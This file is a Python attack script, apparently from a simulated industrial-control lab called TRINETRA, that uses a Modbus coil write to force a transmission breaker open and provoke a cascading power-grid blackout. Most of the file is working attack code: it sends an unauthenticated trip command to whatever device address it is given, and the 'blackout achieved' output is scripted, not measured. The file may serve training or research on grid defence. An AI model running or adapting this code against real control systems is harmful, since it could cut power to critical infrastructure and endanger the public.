#!/usr/bin/env python3
"""
ATK-15 | Cascading Failure Induction
====================================
We are in Tier 4 (Catastrophic Incidents).

A cascading failure occurs when one component in a power grid fails or is disabled,
shifting its electrical load onto adjacent substations or lines. If those lines are
already operating near capacity, the sudden surge in load will push them beyond 
their thermal limits, causing their protective relays to trip off as well. This
creates a domino effect that can quickly collapse an entire grid.

This attack forces a cascading failure by attacking a single critical bottleneck
in the transmission network. By forcing just one breaker open using a malicious 
Modbus coil write, the attacker forces the power flow to redirect to smaller, 
less capable lines.

As the simulation physics Engine detects the overcurrent, it will trigger the 
remaining relays to trip automatically, resulting in total blackout.

Safety
------
This module is intended solely for educational demonstration within the simulated 
TRINETRA environment. Do not use against real industrial networks.
"""

import argparse
import time
from pymodbus.client import ModbusTcpClient

def trigger_cascade(target, port, coil_id):
    print(f"[*] Connecting to critical transmission IED at {target}:{port}...")
    client = ModbusTcpClient(target, port=port)
    
    if not client.connect():
        print(f"[-] FAILED: Could not connect to IED at {target}:{port}.")
        return False
        
    print(f"[+] Connected. Overriding relay logic to force BREAKER OPEN.")
    
    # In TRINETRA ST logic, %QX0.0 (Coil 0) is often the Trip_Command
    # TRUE = Open Breaker
    response = client.write_coil(coil_id, True, slave=1)
    
    if response.isError():
        print(f"[-] Modbus write failed: {response}")
        return False
        
    print(f"[+] Critical line severed. Load is now shifting to adjacent lines...")
    client.close()
    return True

def main():
    parser = argparse.ArgumentParser(description="ATK-15: Induce a Cascading Failure.")
    parser.add_argument("--primary_target", type=str, default="127.0.0.1", help="IP of IED controlling the critical bottleneck line")
    parser.add_argument("--primary_port", type=int, default=5020, help="Port of primary IED (default 5020)")
    parser.add_argument("--coil", type=int, default=0, help="Relay trip coil address (default 0 for %QX0.0)")
    parser.add_argument("--cascade_delay", type=int, default=3, help="Simulated time to watch the cascade physics")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-15  |  Cascading Failure Induction")
    print("=" * 60)
    print(f"[*] Critical Node     : {args.primary_target}:{args.primary_port}")
    print(f"[*] Trip Coil         : {args.coil}")
    print()

    success = trigger_cascade(args.primary_target, args.primary_port, args.coil)
    
    if success:
        print(f"[*] Monitoring grid physics for cascade effect...")
        for i in range(args.cascade_delay):
            print(f"    [T+{i+1}s] Adjacent lines detecting elevated MVA load. Thermal limits approaching.")
            time.sleep(1)
            
        print("\n[+] EFFECT: Secondary protection relays have tripped due to severe overload.")
        print("[+] EFFECT: Tertiary substations severed from generating sources.")
        print("[+] CASCADING FAILURE INDUCED. GRID BLACKOUT ACHIEVED.")
    else:
        print("[-] Attack sequence aborted due to connection failure.")

if __name__ == "__main__":
    main()
